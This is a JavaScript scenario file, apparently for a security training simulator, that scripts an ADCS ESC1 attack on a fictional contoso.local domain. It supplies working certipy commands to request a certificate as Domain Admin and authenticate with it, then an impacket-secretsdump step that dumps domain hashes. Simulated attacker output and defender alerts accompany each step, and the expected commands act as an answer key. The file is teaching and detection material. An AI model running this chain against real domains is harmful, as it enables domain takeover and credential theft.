export default {
  id: 'adcs-esc1',
  title: 'ADCS ESC1 - Certificate Template Abuse',
  description: 'Exploit a misconfigured certificate template (ESC1) to request a certificate as Domain Admin and authenticate using Kerberos PKINIT.',
  difficulty: 'Advanced',
  mitreAttack: 'T1649',
  network: {
    attacker: { hostname: 'KALI-ATTACK', ip: '10.0.0.5' },
    target: { hostname: 'PKI-CA01', ip: '10.0.1.15' },
    dc: { hostname: 'DC01', ip: '10.0.1.10' },
    domain: 'contoso.local'
  },
  steps: [
    {
      id: 0,
      description: 'Enumerate Active Directory Certificate Services to identify available Certificate Authorities and templates.',
      expectedCommand: 'certipy find -u john@contoso.local -p Password123! -dc-ip 10.0.1.10',
      expectedCommands: [
        'certipy find -u john@contoso.local -p Password123! -dc-ip 10.0.1.10',
        'certipy find -u john@contoso.local -p Password123! -dc-ip 10.0.1.10 -vulnerable'
      ],
      hintShort: 'Use Certipy to enumerate ADCS infrastructure',
      hintFull: 'Run: certipy find -u john@contoso.local -p Password123! -dc-ip 10.0.1.10',
      attackerOutput: [
        'Certipy v4.8.2 - by Oliver Lyak (ly4k)',
        '',
        '[*] Finding certificate templates',
        '[*] Found 47 certificate templates',
        '[*] Finding certificate authorities',
        '[*] Found 1 certificate authority',
        '[*] Finding vulnerable templates',
        '',
        '═══════════════════════════════════════════════════════════',
        'Certificate Authority',
        '═══════════════════════════════════════════════════════════',
        'CA Name                     : PKI-CA01',
        'DNS Name                    : PKI-CA01.contoso.local',
        'Certificate Subject         : CN=CONTOSO-PKI-CA01-CA, DC=contoso, DC=local',
        'Certificate Serial Number   : 1A2B3C4D5E6F',
        'Certificate Validity Start  : 2024-01-01 00:00:00',
        'Certificate Validity End    : 2029-01-01 00:00:00',
        '',
        '═══════════════════════════════════════════════════════════',
        'Vulnerable Certificate Template: ESC1',
        '═══════════════════════════════════════════════════════════',
        'Template Name               : UserAuthentication',
        'Enabled                     : True',
        'Client Authentication       : True',
        'Enrollee Supplies Subject   : True  [!] VULNERABLE',
        'Requires Manager Approval   : False',
        'Authorized Signatures       : 0',
        'Validity Period             : 1 year',
        'Enrollment Rights           : CONTOSO\\Domain Users',
        '',
        '[!] ESC1 VULNERABILITY DETECTED!',
        '[*] Template allows enrollee to specify Subject Alternative Name',
        '[*] Any domain user can request certificate as ANY user (including DA)'
      ],
      serverOutput: [
        '[LDAP] Certificate template enumeration from 10.0.0.5',
        '[LDAP] Query: (objectClass=pKICertificateTemplate)',
        '[LDAP] Returned 47 certificate templates',
        '[PKI] CA configuration accessed'
      ],
      delay: 200
    },
    {
      id: 1,
      description: 'Request a certificate from the vulnerable template, specifying Domain Admin as the Subject Alternative Name.',
      expectedCommand: 'certipy req -u john@contoso.local -p Password123! -ca PKI-CA01 -target PKI-CA01.contoso.local -template UserAuthentication -upn administrator@contoso.local',
      hintShort: 'Request a certificate with administrator@contoso.local as the UPN',
      hintFull: 'Use certipy req with -upn administrator@contoso.local to impersonate Domain Admin',
      lootToGrant: {
        files: {
          'administrator.pfx': {
            content: '[PFX Certificate Data - Base64 Encoded]\nMIIKDAIBAzCCCc...[truncated]'
          }
        },
        download: ['administrator.pfx', 'administrator_key.pem']
      },
      attackerOutput: [
        'Certipy v4.8.2 - by Oliver Lyak (ly4k)',
        '',
        '[*] Requesting certificate from PKI-CA01',
        '[*] Template: UserAuthentication',
        '[*] Subject Alternative Name: administrator@contoso.local',
        '',
        '[*] Successfully requested certificate',
        '[*] Request ID: 287',
        '[*] Certificate saved to: administrator.pfx',
        '[*] Private key saved to: administrator_key.pem',
        '',
        '═══════════════════════════════════════════════════════════',
        'Certificate Details',
        '═══════════════════════════════════════════════════════════',
        'Subject              : CN=john',
        'SAN (UPN)            : administrator@contoso.local  [!]',
        'Issuer               : CN=CONTOSO-PKI-CA01-CA',
        'Serial Number        : 4F3A2B1C5D6E7890',
        'Validity Start       : 2025-11-15 05:43:00',
        'Validity End         : 2026-11-15 05:43:00',
        'Enhanced Key Usage   : Client Authentication',
        '',
        '[✓] Successfully obtained certificate for Domain Admin!',
        '[*] Can now authenticate as administrator using PKINIT'
      ],
      serverOutput: [
        '[PKI-CA] Certificate request received from 10.0.0.5',
        '[PKI-CA] Requestor: john@contoso.local',
        '[PKI-CA] Template: UserAuthentication',
        '[PKI-CA] Subject Alternative Name: administrator@contoso.local',
        '[CRITICAL] Certificate issued with privileged UPN!',
        '[ALERT] Potential ESC1 exploitation detected',
        '[DEFENSE] ALERT: Certificate issued for Domain Admin account to non-admin user!'
      ],
      delay: 250
    },
    {
      id: 2,
      description: 'Use the obtained certificate to authenticate as Domain Admin via Kerberos PKINIT and retrieve the NTLM hash.',
      expectedCommand: 'certipy auth -pfx administrator.pfx -dc-ip 10.0.1.10',
      hintShort: 'Authenticate using the PFX certificate',
      hintFull: 'Run: certipy auth -pfx administrator.pfx -dc-ip 10.0.1.10',
      lootToGrant: {
        creds: [
          {
            type: 'NTLM Hash',
            username: 'administrator',
            secret: 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'
          }
        ]
      },
      attackerOutput: [
        'Certipy v4.8.2 - by Oliver Lyak (ly4k)',
        '',
        '[*] Using certificate: administrator.pfx',
        '[*] Requesting TGT via PKINIT',
        '[*] AS-REQ to KDC: 10.0.1.10',
        '',
        '[*] Successfully authenticated!',
        '[*] Got TGT for administrator@contoso.local',
        '[*] Saved TGT to administrator.ccache',
        '',
        '═══════════════════════════════════════════════════════════',
        'Credentials Retrieved',
        '═══════════════════════════════════════════════════════════',
        'Username: administrator',
        'Domain  : CONTOSO',
        'NTLM    : aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c',
        '',
        '[✓] NTLM hash extracted successfully!',
        '[*] Can now perform Pass-the-Hash attacks as Domain Admin'
      ],
      serverOutput: [
        '[KDC] AS-REQ received with PKINIT pre-authentication',
        '[KDC] Certificate validation successful',
        '[KDC] Certificate UPN: administrator@contoso.local',
        '[KDC] Issuing TGT for administrator',
        '[SECURITY] Domain Admin TGT issued via certificate authentication',
        '[CRITICAL] Privileged access granted through certificate',
        '[DEFENSE] ALERT: Certificate-based authentication for Domain Admin from unusual location!'
      ],
      delay: 200
    },
    {
      id: 3,
      description: 'Verify Domain Admin access by listing domain administrators using the compromised credentials.',
      expectedCommand: 'impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrator@10.0.1.10',
      expectedCommands: [
        'impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrator@10.0.1.10',
        'net group "Domain Admins" /domain',
        'Get-ADGroupMember -Identity "Domain Admins"'
      ],
      hintShort: 'Dump domain secrets using the administrator hash',
      hintFull: 'Use impacket-secretsdump with the NTLM hash to extract domain secrets',
      attackerOutput: [
        'Impacket v0.11.0 - Copyright 2023 Fortra',
        '',
        '[*] Service RemoteRegistry is in stopped state',
        '[*] Starting service RemoteRegistry',
        '[*] Target system bootKey: 0x8a2b7c9d1e4f5a6b',
        '[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)',
        'Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::',
        'Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        '[*] Dumping cached domain logon information (domain/username:hash)',
        '[*] Dumping LSA Secrets',
        '[*] $MACHINE.ACC',
        'CONTOSO\\DC01$:aes256-cts-hmac-sha1-96:a1b2c3d4e5f6...',
        '[*] DPAPI_SYSTEM',
        'dpapi_machinekey:0x9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d',
        '[*] NL$KM',
        'NL$KM:0xaabbccdd112233445566778899aabbcc',
        '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)',
        '[*] Using the DRSUAPI method to get NTDS.DIT secrets',
        'Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::',
        'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d:::',
        'john:1104:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::',
        'jane:1105:aad3b435b51404eeaad3b435b51404ee:6b8ab9e4c1d2f3a5b7c8d9e0f1a2b3c4:::',
        '',
        '[✓] Successfully dumped domain secrets!',
        '[*] Full domain compromise achieved',
        '',
        '═══════════════════════════════════════════════════════════',
        '  ADCS ESC1 ATTACK COMPLETE',
        '═══════════════════════════════════════════════════════════',
        '  ✓ Enumerated certificate templates',
        '  ✓ Identified ESC1 vulnerability',
        '  ✓ Requested certificate as Domain Admin',
        '  ✓ Authenticated via PKINIT',
        '  ✓ Extracted NTLM hashes',
        '  ✓ Dumped domain credentials',
        '═══════════════════════════════════════════════════════════'
      ],
      serverOutput: [
        '[DRSUAPI] Replication request from 10.0.0.5',
        '[DRSUAPI] Authenticated as: administrator',
        '[DRSUAPI] Replicating NTDS.DIT database',
        '[CRITICAL] Full domain database replication initiated!',
        '[CRITICAL] NTLM hashes for all domain users extracted!',
        '[DEFENSE] ALERT: DCSync attack detected! Administrator credentials used from unauthorized host!'
      ],
      delay: 300
    }
  ]
};
